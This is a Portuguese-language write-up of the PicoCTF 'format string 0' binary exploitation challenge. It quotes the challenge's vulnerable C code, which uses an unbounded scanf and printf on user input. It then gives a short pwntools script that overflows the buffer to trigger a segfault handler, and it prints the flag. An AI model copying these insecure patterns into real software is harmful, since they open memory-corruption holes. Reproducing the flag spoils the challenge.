# WriteUp: format string 0
## Descrição do Desafio:
**Autor**: Cheng Zhang \
**Plataforma**: [PicoCTF](https://play.picoctf.org/practice/challenge/433?category=6&page=1) \
**Categoria**: Binary Exploitation \
**Dificuldade**: Fácil \
**Data**: 2024 \
**Descrição**:
> Can you use your knowledge of format strings to make the customers happy?
## Passo a Passo da Solução
### 1. Análise do arquivo fornecido
Este desafio nos fornece o seu código fonte, `.c`. Analisando ele, vemos que ele contém diversas funções, mas elas estão todas ali para te distrair, porque logo na `main()` podemos notar que é setado uma função para caso ocorra *segmentation fault*, e a função que é chamada imprime a **flag** para nós.

{% code title="vuln.c" overflow="wrap" lineNumbers="true" %}

```c
void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

...........

int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();
  
    return 0;
}
```

{% endcode %}

Outra coisa muito interessante, é que na função `serve_patrick()`, podemos estourar um *buffer* que tem ali, causando *segmentation fault*.

{% code title="vuln.c" overflow="wrap" lineNumbers="true" %}

```c
void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1); //Estouro de buffer.
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}
```

{% endcode %}

### 2. Solução
A solução é simples, basta estourar o *buffer* na função `serve_patrick()`.
### 2.1 Solução com Python

{% code title="solve.py" overflow="wrap" lineNumbers="true" %}

```py
from pwn import *

p = remote(ip, porta) #Troque pelos valores

payload = "A" * 100

p.sendlineafter(b"recommendation: ", payload)
print(p.recvall().decode())
```

{% endcode %}

### Flag
`picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}`
## Autor da WriteUp
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)
